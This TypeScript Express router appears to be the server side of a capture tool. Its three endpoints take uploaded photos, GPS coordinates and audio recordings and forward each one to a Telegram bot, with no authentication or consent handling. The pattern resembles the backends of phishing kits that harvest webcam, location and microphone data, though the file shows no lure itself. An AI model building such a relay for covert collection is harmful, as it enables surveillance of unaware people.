import { Router, type IRouter } from "express";
import { Buffer } from "buffer";
import {
  sendPhotoToTelegram,
  sendLocationToTelegram,
  sendAudioToTelegram,
} from "../lib/telegram-bot";

const router: IRouter = Router();

router.post("/upload", async (req, res) => {
  try {
    const raw: string = req.body;
    const base64Data = raw.split(",")[1];
    const imgBuffer = Buffer.from(base64Data, "base64");
    await sendPhotoToTelegram(imgBuffer);
    res.json({ status: "sent" });
  } catch (err) {
    console.error("Upload error:", err);
    res.status(500).json({ status: "error" });
  }
});

router.post("/upload-location", async (req, res) => {
  try {
    const { lat, lon } = req.body as { lat: number; lon: number };
    await sendLocationToTelegram(lat, lon);
    res.json({ status: "sent" });
  } catch (err) {
    console.error("Location error:", err);
    res.status(500).json({ status: "error" });
  }
});

router.post("/upload-audio", async (req, res) => {
  try {
    const raw: string = req.body;
    const [header, data] = raw.split(",");
    const mimeMatch = header.match(/data:([^;]+);base64/);
    const mimeType = mimeMatch ? mimeMatch[1] : "audio/webm";
    const audioBuffer = Buffer.from(data, "base64");
    await sendAudioToTelegram(audioBuffer, mimeType);
    res.json({ status: "sent" });
  } catch (err) {
    console.error("Audio error:", err);
    res.status(500).json({ status: "error" });
  }
});

export default router;
